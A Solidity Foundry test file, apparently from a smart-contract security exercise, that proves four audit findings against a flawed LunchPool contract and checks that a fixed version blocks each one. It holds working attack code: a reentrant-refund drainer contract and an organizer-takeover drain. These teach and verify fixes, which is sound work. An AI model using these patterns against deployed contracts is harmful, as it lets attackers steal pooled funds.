// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {LunchPool} from "../../src/b05/LunchPool.sol";
import {LunchPoolFixed} from "../../solution/LunchPoolFixed.sol";

/// @notice H-02 的攻击合约。只用于本地测试。
contract RefundReenter {
    LunchPool pool;
    uint256 stake;

    constructor(LunchPool _pool) {
        pool = _pool;
    }

    function attack() external payable {
        stake = msg.value;
        pool.contribute{value: msg.value}();
        pool.refund();
    }

    receive() external payable {
        if (address(pool).balance >= stake) pool.refund();
    }
}

/// @notice 同样的重入尝试，指向修复版。
contract RefundReenterOnFixed {
    LunchPoolFixed pool;
    bool public blocked;

    constructor(LunchPoolFixed _pool) {
        pool = _pool;
    }

    function attack() external payable {
        pool.contribute{value: msg.value}();
        pool.refund();
    }

    receive() external payable {
        try pool.refund() {} catch {
            blocked = true;
        }
    }
}

/// @notice M-01：出资后拒收 ETH 的地址。
contract RejectEther {
    function join(LunchPool pool) external payable {
        pool.contribute{value: msg.value}();
    }

    receive() external payable {
        revert("no thanks");
    }
}

contract RejectEtherOnFixed {
    function join(LunchPoolFixed pool) external payable {
        pool.contribute{value: msg.value}();
    }

    receive() external payable {
        revert("no thanks");
    }
}

contract LunchPoolPoC is Test {
    LunchPool pool;
    LunchPoolFixed fixedPool;
    uint256 deadline;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address mallory = makeAddr("mallory");

    function setUp() public {
        vm.warp(1_000_000);
        deadline = block.timestamp + 1 hours;
        pool = new LunchPool(deadline);
        fixedPool = new LunchPoolFixed(deadline);
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(mallory, 1 ether);
    }

    // H-01
    function test_PoC_H01_AnyoneTakesOrganizerAndDrains() public {
        vm.prank(alice);
        pool.contribute{value: 10 ether}();

        vm.startPrank(mallory);
        pool.setOrganizer(mallory);
        vm.warp(deadline);
        pool.payVendor(payable(mallory));
        vm.stopPrank();

        assertEq(mallory.balance, 11 ether);
        assertEq(address(pool).balance, 0);
    }

    function test_Fix_H01_StrangerCannotSetOrganizer() public {
        vm.prank(mallory);
        vm.expectRevert("not organizer");
        fixedPool.setOrganizer(mallory);
    }

    // H-02
    function test_PoC_H02_ReentrantRefundDrainsPool() public {
        vm.prank(alice);
        pool.contribute{value: 10 ether}();

        RefundReenter attacker = new RefundReenter(pool);
        vm.prank(mallory);
        attacker.attack{value: 1 ether}();

        assertEq(address(pool).balance, 0);
        assertEq(address(attacker).balance, 11 ether);
        assertEq(pool.paidBy(alice), 10 ether); // 账面还在，钱没了
    }

    function test_Fix_H02_ReentryGetsNothingExtra() public {
        vm.prank(alice);
        fixedPool.contribute{value: 10 ether}();

        RefundReenterOnFixed attacker = new RefundReenterOnFixed(fixedPool);
        vm.prank(mallory);
        attacker.attack{value: 1 ether}();

        assertTrue(attacker.blocked());
        assertEq(address(attacker).balance, 1 ether);
        assertEq(address(fixedPool).balance, 10 ether);
    }

    // M-01
    function test_PoC_M01_OneRejecterBlocksCancelAll() public {
        vm.prank(alice);
        pool.contribute{value: 1 ether}();
        RejectEther rejecter = new RejectEther();
        vm.prank(mallory);
        rejecter.join{value: 0.001 ether}(pool);

        vm.warp(deadline);
        vm.expectRevert("transfer failed");
        pool.cancelAll();

        // 截止后 alice 也不能自助退款。
        vm.warp(deadline + 1);
        vm.prank(alice);
        vm.expectRevert("closed");
        pool.refund();
    }

    function test_Fix_M01_RejecterCannotBlockOthers() public {
        vm.prank(alice);
        fixedPool.contribute{value: 1 ether}();
        RejectEtherOnFixed rejecter = new RejectEtherOnFixed();
        vm.prank(mallory);
        rejecter.join{value: 0.001 ether}(fixedPool);

        vm.warp(deadline);
        fixedPool.cancelAll();

        uint256 before = alice.balance;
        vm.prank(alice);
        fixedPool.refund();
        assertEq(alice.balance, before + 1 ether);
    }

    // L-01
    function test_PoC_L01_RefundAllowedAtDeadline() public {
        vm.prank(alice);
        pool.contribute{value: 1 ether}();

        vm.warp(deadline); // 规格：截止时刻当秒不再允许
        vm.prank(alice);
        pool.refund();

        assertEq(pool.paidBy(alice), 0);
    }

    function test_Fix_L01_RefundRejectedAtDeadline() public {
        vm.prank(alice);
        fixedPool.contribute{value: 1 ether}();

        vm.warp(deadline);
        vm.prank(alice);
        vm.expectRevert("closed");
        fixedPool.refund();
    }
}
